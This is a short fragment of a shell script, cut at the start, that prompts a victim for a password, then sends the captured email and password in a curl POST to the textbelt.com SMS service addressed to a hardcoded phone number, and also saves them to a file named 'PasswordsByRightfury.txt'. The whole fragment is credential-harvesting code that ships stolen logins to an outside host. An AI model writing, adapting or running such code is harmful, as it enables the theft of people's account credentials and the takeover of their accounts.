...
read password
curl -# -X POST https://textbelt.com/text --data-urlencode phone="2367004170" --data-urlencode message=" $correo $password " -d key=textbelt
echo "$correo $password" > PasswordsByRightfury.txt
